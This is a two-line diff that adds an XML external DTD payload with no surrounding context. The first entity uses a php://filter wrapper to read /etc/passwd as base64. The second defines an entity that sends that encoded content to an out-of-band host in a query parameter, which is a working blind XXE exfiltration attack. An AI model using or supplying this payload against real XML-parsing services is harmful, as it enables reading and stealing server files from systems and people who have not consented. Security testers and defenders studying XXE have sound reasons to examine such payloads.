@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM '%oob;?data=%data;'>">
